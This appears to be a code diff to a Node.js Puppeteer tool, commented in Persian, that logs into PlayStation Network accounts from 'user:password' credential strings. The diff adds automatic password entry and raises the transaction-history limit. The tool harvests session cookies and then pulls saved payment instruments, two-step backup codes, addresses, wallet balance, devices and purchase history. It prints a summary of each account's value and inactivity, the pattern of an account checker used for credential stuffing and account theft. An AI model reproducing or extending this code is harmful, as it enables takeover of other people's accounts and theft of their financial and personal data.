@@ -22,7 +22,7 @@ const TARGET_URLS = [
   "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
   /\/twostepbackupcodes$/,
   "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
-  "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments"
+  "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
 ];
 
 // Page configurations
@@ -238,22 +238,18 @@ async function setupRequestAndResponseTracking(
             const operationName = extractOperationName(url);
             console.log("operationName =======> ", operationName);
 
-            if(operationName === 'operationName') {
-              const allCookies = await page.cookies()
-              const twoSteps = await axios.get(
-                url,
-                {
-                  headers: {
-                    Cookie: allCookies
-                      .map((cookie) => `${cookie.name}=${cookie.value}`)
-                      .join("; "),
-                  },
-                }
-              );
+            if (operationName === "operationName") {
+              const allCookies = await page.cookies();
+              const twoSteps = await axios.get(url, {
+                headers: {
+                  Cookie: allCookies
+                    .map((cookie) => `${cookie.name}=${cookie.value}`)
+                    .join("; "),
+                },
+              });
 
               console.log(twoSteps);
-              process.exit(1)
-              
+              process.exit(1);
             }
 
             processTargetResponse(operationName, responseData, finalResponses);
@@ -500,7 +496,8 @@ async function runPsnApiTool(options) {
 
   // Browser launch options
   const browserOptions = {
-    headless: 'new', // در تولید می‌توانید headless را true کنید
+    executablePath: "/home/majid/Documents/chrome-linux/chrome",
+    headless: false, // در تولید می‌توانید headless را true کنید
     defaultViewport: { width: 1920, height: 1080 },
     args: [
       "--no-sandbox",
@@ -511,7 +508,7 @@ async function runPsnApiTool(options) {
       "--disable-site-isolation-trials",
       "--disable-dev-shm-usage",
       "--disable-accelerated-2d-canvas",
-      "--disable-gpu"
+      "--disable-gpu",
     ],
   };
 
@@ -541,19 +538,129 @@ async function runPsnApiTool(options) {
     );
 
     // Navigate to first page
-    await navigateToPage(
-      page1,
-      PAGE_CONFIGS.FIRST.url,
-      "صفحه اول",
-      onProgress
-    );
+    await navigateToPage(page1, PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);
 
     // Wait for first page to fully load and cookies to be set
-    await wait(
-      10000,
-      "تا بارگذاری صفحه اول کامل شود",
-      onProgress
-    );
+    await wait(10000, "تا بارگذاری صفحه اول کامل شود", onProgress);
+
+    // بررسی وجود المان مورد نظر و کلیک روی آن
+    try {
+      const targetXPath =
+        "/html/body/div[3]/div/div[2]/div/div/div/main/div/div[2]/div/div/div/div[3]/div";
+      onProgress(`در حال بررسی وجود المان با XPath: ${targetXPath}`);
+
+      // انتظار برای ظاهر شدن المان با timeout مناسب
+      const targetElement = await page1
+        .waitForXPath(targetXPath, {
+          visible: true,
+          timeout: 8000,
+        })
+        .catch(() => null);
+
+      if (targetElement) {
+        onProgress("المان مورد نظر یافت شد؛ در حال کلیک...");
+        await targetElement.click();
+        onProgress("کلیک روی المان انجام شد.");
+
+        // انتظار برای ناوبری پس از کلیک
+        onProgress("در انتظار بارگذاری صفحه پس از کلیک...");
+        await Promise.race([
+          page1.waitForNavigation({
+            waitUntil: "networkidle2",
+            timeout: 10000,
+          }),
+          wait(6000, "برای اطمینان از بارگذاری صفحه", onProgress),
+        ]).catch(() => {
+          onProgress(
+            "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
+          );
+        });
+
+        onProgress("ادامه پردازش پس از کلیک روی المان");
+      } else {
+        onProgress("المان مورد نظر در صفحه یافت نشد؛ ادامه روند...");
+      }
+    } catch (error) {
+      onProgress(`خطا در بررسی یا کلیک روی المان: ${error.message}`);
+    }
+
+    // بررسی وجود فیلد ورود پسورد و پر کردن آن
+    try {
+      const passwordInputXPath =
+        "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[1]/div[2]/div/div/input";
+      const submitButtonXPath =
+        "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div[2]/div/div/main/div/div[2]/div/form/div[3]/div/button";
+
+      onProgress("در حال بررسی وجود فیلد ورود پسورد...");
+
+      // انتظار برای ظاهر شدن فیلد پسورد با timeout مناسب
+      const passwordInput = await page1
+        .waitForXPath(passwordInputXPath, {
+          visible: true,
+          timeout: 5000,
+        })
+        .catch(() => null);
+
+      if (passwordInput) {
+        onProgress("فیلد ورود پسورد یافت شد؛ در حال پر کردن...");
+
+        // استخراج پسورد از credentials
+        const password = credentials.includes(":")
+          ? credentials.split(":")[1]
+          : "";
+
+        if (password) {
+          // پاک کردن محتوای فیلد قبل از وارد کردن پسورد
+          await passwordInput.click({ clickCount: 3 });
+          await passwordInput.press("Backspace");
+
+          // وارد کردن پسورد
+          await passwordInput.type(password, { delay: 50 });
+          onProgress("پسورد با موفقیت وارد شد.");
+
+          // انتظار برای دکمه ثبت
+          const submitButton = await page1
+            .waitForXPath(submitButtonXPath, {
+              visible: true,
+              timeout: 5000,
+            })
+            .catch(() => null);
+
+          if (submitButton) {
+            onProgress("دکمه ثبت یافت شد؛ در حال کلیک...");
+            await submitButton.click();
+            onProgress("کلیک روی دکمه ثبت انجام شد.");
+
+            // انتظار برای ناوبری پس از کلیک روی دکمه
+            onProgress("در انتظار بارگذاری صفحه پس از ثبت پسورد...");
+            await Promise.race([
+              page1.waitForNavigation({
+                waitUntil: "networkidle2",
+                timeout: 10000,
+              }),
+              wait(5000, "برای اطمینان از بارگذاری صفحه", onProgress),
+            ]).catch(() => {
+              onProgress(
+                "انتظار برای ناوبری به پایان رسید (ممکن است صفحه تغییر نکرده باشد)"
+              );
+            });
+
+            // رفرش صفحه
+            onProgress("در حال رفرش صفحه...");
+            await page1.reload({ waitUntil: "networkidle2" });
+            onProgress("صفحه با موفقیت رفرش شد.");
+          } else {
+            onProgress("دکمه ثبت یافت نشد.");
+          }
+        } else {
+          onProgress("پسورد در credentials یافت نشد یا فرمت نادرست است.");
+        }
+      } else {
+        onProgress("فیلد ورود پسورد در صفحه یافت نشد؛ ادامه روند...");
+      }
+    } catch (error) {
+      onProgress(`خطا در پر کردن فیلد پسورد: ${error.message}`);
+    }
 
     // Get cookies from first page
     const cookies = await page1.cookies();
@@ -569,11 +676,11 @@ async function runPsnApiTool(options) {
     try {
       onProgress("در حال تلاش برای کلیک روی عنصر مشخص...");
       await page1.waitForXPath(
-        '/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div',
+        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div",
         { timeout: 20000 }
       );
       const [element] = await page1.$x(
-        '/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div'
+        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div"
       );
 
       if (element) {
@@ -585,21 +692,29 @@ async function runPsnApiTool(options) {
 
         onProgress("در انتظار ناوبری پس از کلیک اول...");
         try {
-          await page1.waitForNavigation({
-            waitUntil: "networkidle2",
-            timeout: 10000,
-          }).catch(() => {
-            onProgress("ناوبری رخ نداد یا قبلاً انجام شده است.");
-          });
+          await page1
+            .waitForNavigation({
+              waitUntil: "networkidle2",
+              timeout: 10000,
+            })
+            .catch(() => {
+              onProgress("ناوبری رخ نداد یا قبلاً انجام شده است.");
+            });
           await wait(3000, "تا پایداری صفحه جدید", onProgress);
           onProgress(
             'در حال تلاش برای یافتن و کلیک روی عنصري با XPath مشخص: //*[@id="ember138"]/div/div/div/div[1]/div'
           );
-          await page1.waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', { timeout: 5000 }).catch(e => {
-            onProgress(`عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`);
-          });
+          await page1
+            .waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', {
+              timeout: 5000,
+            })
+            .catch((e) => {
+              onProgress(
+                `عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`
+              );
+            });
           const [secondElement] = await page1.$x(
-            '/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div'
+            "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div"
           );
           if (secondElement) {
             onProgress("عنصر دوم پیدا شد؛ کلیک...");
@@ -640,7 +755,7 @@ async function runPsnApiTool(options) {
       onProgress
     );
 
-    await wait(8000, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
+    await wait(3000, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
 
     await navigateToPage(
       page2,
@@ -664,9 +779,14 @@ async function runPsnApiTool(options) {
     const finalPage1Cookies = await page1.cookies();
     const finalPage2Cookies = await page2.cookies();
 
-    onProgress(`تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`);
+    onProgress(
+      `تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`
+    );
 
-    const allCookies = combineUniqueCookies(finalPage1Cookies, finalPage2Cookies);
+    const allCookies = combineUniqueCookies(
+      finalPage1Cookies,
+      finalPage2Cookies
+    );
     onProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`);
 
     const creditCards = await axios.get(
@@ -702,7 +822,7 @@ async function runPsnApiTool(options) {
       "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
       {
         params: {
-          limit: 180,
+          limit: 500,
           startDate: "2010-01-01T00:00:00.000-0400",
           endDate: "2025-04-06T23:59:59.999-0400",
           includePurged: false,
@@ -727,7 +847,9 @@ async function runPsnApiTool(options) {
       }
     );
 
-    const plusTitle = finalResponses.profile?.isPsPlusMember ? findAndProcessPlayStationPlusItem(transactions.data.transactions) : null
+    const plusTitle = finalResponses.profile?.isPsPlusMember
+      ? findAndProcessPlayStationPlusItem(transactions.data.transactions)
+      : null;
 
     finalResponses = {
       ...finalResponses,
@@ -806,14 +928,24 @@ async function runPsnApiTool(options) {
             : "N/A"
         } ]
 --------------------------- « Details » --------------------------
-- Country | City | Postal Code : ${finalResponses.address?.country ||  "N/A"} - ${finalResponses.address?.city ||  "N/A"} - ${finalResponses.address?.postalCode || "N/A"}
-- Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}
+- Country | City | Postal Code : ${
+          finalResponses.address?.country || "N/A"
+        } - ${finalResponses.address?.city || "N/A"} - ${
+          finalResponses.address?.postalCode || "N/A"
+        }
+- Balance : ${finalResponses.wallets?.debtBalance}.${
+          finalResponses.wallets?.currentAmount
+        } ${finalResponses.wallets?.currencyCode || ""}
 - PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
 - Payments : ${finalResponses.creditCards || "Not Found"} 
-- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${plusTitle}` : "No!"}
+- PS Plus : ${
+          finalResponses.profile?.isPsPlusMember ? `Yes! - ${plusTitle}` : "No!"
+        }
 - Devices : [ ${
           finalResponses.newDevices
-            ? [...new Set(finalResponses.newDevices.map((d) => d.deviceType))].join(" - ")
+            ? [
+                ...new Set(finalResponses.newDevices.map((d) => d.deviceType)),
+              ].join(" - ")
             : "N/A"
         } ]
 - Deactive : ${hasSixMonthsPassed === false ? "No!" : "Yes!"}
@@ -874,7 +1006,11 @@ function generatePaymentMethodsText(response) {
     });
   }
 
-  if (response.payPal && response.payPal.common.isPaymentMethodAvailable && !response.payPal.common.banned) {
+  if (
+    response.payPal &&
+    response.payPal.common.isPaymentMethodAvailable &&
+    !response.payPal.common.banned
+  ) {
     paymentMethodsText.push(`[PayPal]`);
   }
 
@@ -885,35 +1021,43 @@ function findAndProcessPlayStationPlusItem(data) {
   if (!Array.isArray(data)) {
     return null;
   }
-  
+
   for (const invoice of data) {
-    if (invoice.additionalInfo && Array.isArray(invoice.additionalInfo.orderItems)) {
+    if (
+      invoice.additionalInfo &&
+      Array.isArray(invoice.additionalInfo.orderItems)
+    ) {
       for (const orderItem of invoice.additionalInfo.orderItems) {
-        if (orderItem.productName && orderItem.productName.includes("PlayStation Plus")) {
+        if (
+          orderItem.productName &&
+          orderItem.productName.includes("PlayStation Plus")
+        ) {
           // استخراج عنوان
           const title = orderItem.productName;
-          
+
           // استخراج عدد از عنوان (به عنوان ماه)
           const monthMatch = title.match(/\d+/);
           const months = monthMatch ? parseInt(monthMatch[0]) : 0;
-          
+
           // استخراج تاریخ تراکنش
-          const transactionDate = new Date(invoice.transactionDetail.transactionDate);
-          
+          const transactionDate = new Date(
+            invoice.transactionDetail.transactionDate
+          );
+
           // اضافه کردن ماه‌ها به تاریخ
           const resultDate = new Date(transactionDate);
           resultDate.setMonth(resultDate.getMonth() + months);
-          
+
           // فرمت کردن تاریخ به صورت YYYY-MM-DD
-          const formattedDate = resultDate.toISOString().split('T')[0];
-          
+          const formattedDate = resultDate.toISOString().split("T")[0];
+
           // ساخت خروجی نهایی
           return `${title} | ${formattedDate}`;
         }
       }
     }
   }
-  
+
   return null;
 }
 
